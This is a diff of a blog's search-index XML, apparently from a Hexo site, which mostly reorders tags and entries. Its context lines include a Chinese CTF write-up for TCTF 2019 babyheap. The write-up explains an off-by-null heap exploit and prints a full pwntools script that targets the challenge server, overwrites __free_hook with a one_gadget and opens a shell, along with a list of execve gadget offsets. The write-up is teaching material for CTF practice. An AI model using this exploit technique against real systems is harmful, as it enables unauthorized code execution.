@@ -24,28 +24,28 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Learn Address Sanitizer with TCTF 2019 babyaegis]]></title>
-    <url>%2F2019%2F03%2F27%2FLearn-Address-Sanitizer-with-TCTF-2019-babyaegis%2F</url>
-    <content type="text"><![CDATA[比较有趣又能学到新知识的一题。 【施工中】]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>heap</tag>
-        <tag>2019</tag>
-        <tag>tctf</tag>
-        <tag>asan</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[TCTF 2019 babyheap]]></title>
     <url>%2F2019%2F03%2F27%2FTCTF-2019-babyheap%2F</url>
     <content type="text"><![CDATA[程序中的唯一漏洞就是在写入数据时发生了off-by-null。 程序中使用calloc函数作为分配堆块的函数，需要注意该函数不使用tcache，直接调用_int_malloc。 1234567891011121314void *__libc_calloc (size_t n, size_t elem_size)&#123; mstate av; mchunkptr oldtop, p; INTERNAL_SIZE_T bytes, sz, csz, oldtopsize; void *mem; unsigned long clearsize; unsigned long nclears; INTERNAL_SIZE_T *d; // ... mem = _int_malloc (av, sz); // ...&#125; 一开始注意到程序分配了很大一块无用的堆块： 123if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr ) exit(-1);malloc(0x1F000uLL); 这使得top chunk变得非常小了。因此就想到了通过耗尽top chunk来拿到unsorted bin的做法。 第一步先将需要用到的对应大小的fastbin对应的tcache填满，以获得fastbin，并且在分配的过程中不断向top chunk的size溢出\x00以更快的消耗其剩余大小。 在其中适当的位置释放空间连续的fastbin，当top chunk的剩余大小不足以满足分配申请时，将会调用malloc_consolidate函数对fastbin中的空闲chunk进行合并，并放入small bin中，由于申请了空间，small bin被分割后放入unsorted bin。利用常规的off by null和堆块重叠来泄漏地址并供后续fastbin attack。 在进行fastbin attack时，将fd指针指到main_arena中，先把top chunk指到堆的起始位置，即tcache entry处，获取该处内存以用来不断清空tcache计数。随后将top chunk指到stdout附近，通过不断申请、释放、清空tcache计数（避免chunk被放入fastbin而无法使用top chunk）的方法消耗top chunk使其移动到__free_hook附近，并将其改写成one_gadget，通过触发free来getshell。 exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190from pwn import *def add(p, size): p.sendlineafter('Command: ', str(1)) p.sendlineafter('Size: ', str(size)) def update(p, idx, size, content): p.sendlineafter('Command: ', str(2)) p.sendlineafter('Index: ', str(idx)) p.sendlineafter('Size: ', str(size)) p.sendafter('Content: ', content)def delete(p, idx): p.sendlineafter('Command: ', str(3)) p.sendlineafter('Index: ', str(idx))def view(p, idx): p.sendlineafter('Command: ', str(4)) p.sendlineafter('Index: ', str(idx))def pwn(): #p = process('./babyheap') p = remote('111.186.63.20', 10001) elf = ELF('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(7): add(p, 0x28) update(p, i, 0x28, 'a' * 0x28) for i in range(7): delete(p, i) for i in range(7): add(p, 0x38) update(p, i, 0x38, 'a' * 0x38) for i in range(7): delete(p, i) for i in range(8): add(p, 0x48) update(p, i, 0x48, 'a' * 0x48) for i in range(7): delete(p, i) # 7 for i in range(4): # 0 ~ 3 add(p, 0x38) update(p, i, 0x38, 'a' * 0x38) add(p, 0x38) # 4 payload = p64(0) * 4 + p64(0x100) + p64(0x60) + p64(0) update(p, 4, 0x38, payload) add(p, 0x48) # 5 update(p, 5, 0x48, 'a' * 0x48) add(p, 0x38) # 6 update(p, 6, 0x38, 'a' * 0x38) for i in range(5): # 0 ~ 4 delete(p, i) add(p, 0x58) # 0 add(p, 0x58) # 1 add(p, 0x28) # 2 update(p, 2, 0x28, 'a' * 0x28) delete(p, 5) add(p, 0x38) # 3 add(p, 0x38) # 4 add(p, 0x38) # 5 add(p, 0x38) # 8 delete(p, 3) delete(p, 4) add(p, 0x28) # 3 add(p, 0x48) # 4 view(p, 5) p.recvuntil('[5]: ') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7f8b3cdeaca0 - 0x00007f8b3cc06000) add(p, 0x48) # 9 target_address = libc.address + (0x7fd5d1e8bc55 - 0x7fd5d1ca7000) # 5 - 9 is same delete(p, 4) #4 delete(p, 9) #9 delete(p, 2) #2 view(p, 5) p.recvuntil('[5]: ') recv = p.recv(6) + '\x00\x00' heap_address = u64(recv) print hex(target_address) update(p, 5, 0x8, p64(target_address)) add(p, 0x48) # 2 - 5 is same add(p, 0x48) # 4 tcache_entry = heap_address - (0x563db82df850 - 0x563db82c0000) payload = '\x00\x00\x00' + p64(0) * 7 + p64(tcache_entry) update(p, 4, len(payload), payload) add(p, 0x58) # 9 add(p, 0x28) # 10 add(p, 0x28) # 11 add(p, 0x28) # 12 update(p, 12, 0x28, '\x00' * 0x28) delete(p, 10) delete(p, 11) delete(p, 9) payload = '\x00\x00\x00' + p64(0) * 7 + p64(libc.address + 0x7ffff7fc3850 - 0x00007ffff7dde000) update(p, 4, len(payload), payload) count = [9, 10, 11, 13, 14, 15] for i in range(6): add(p, 0x58) # 9 for i in range(6): delete(p, count[i]) update(p, 12, 0x28, '\x00' * 0x28) for j in range(6): for i in range(6): add(p, 0x58) # 9 for i in range(6): delete(p, count[i]) update(p, 12, 0x28, '\x00' * 0x28) add(p, 0x58) # 9 update(p, 9, 8, 'sunichi') add(p, 0x58) # 10 add(p, 0x58) # 11 payload = p64(0) + p64(libc.address + 0x103f50) update(p, 11, len(payload), payload) print hex(heap_address) print hex(libc.address) print hex(target_address) #get shell delete(p, 9) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x50186 execve("/bin/sh", rsp+0x40, environ)constraints: rcx == NULL0x501e3 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x501ef execve("/bin/sh", rsi, [rax])constraints: [rsi] == NULL || rsi == NULL [[rax]] == NULL || [rax] == NULL0xdf39f execve("/bin/sh", rcx, [rbp-0x70])constraints: [rcx] == NULL || rcx == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xdf3a3 execve("/bin/sh", rcx, rdx)constraints: [rcx] == NULL || rcx == NULL [rdx] == NULL || rdx == NULL0xdf3a6 execve("/bin/sh", rsi, rdx)constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL0x103f50 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''']]></content>
       <tags>
         <tag>pwn</tag>
         <tag>ctf</tag>
-        <tag>heap</tag>
         <tag>2019</tag>
         <tag>tctf</tag>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Learn Address Sanitizer with TCTF 2019 babyaegis]]></title>
+    <url>%2F2019%2F03%2F27%2FLearn-Address-Sanitizer-with-TCTF-2019-babyaegis%2F</url>
+    <content type="text"><![CDATA[比较有趣又能学到新知识的一题。 【施工中】]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>2019</tag>
+        <tag>tctf</tag>
+        <tag>heap</tag>
+        <tag>asan</tag>
       </tags>
   </entry>
   <entry>
@@ -66,8 +66,8 @@
         <tag>pwn</tag>
         <tag>ctf</tag>
         <tag>heap</tag>
-        <tag>0ctf</tag>
         <tag>2018</tag>
+        <tag>0ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -164,8 +164,8 @@
         <tag>pwn</tag>
         <tag>ctf</tag>
         <tag>heap</tag>
-        <tag>2018</tag>
         <tag>eis</tag>
+        <tag>2018</tag>
       </tags>
   </entry>
   <entry>
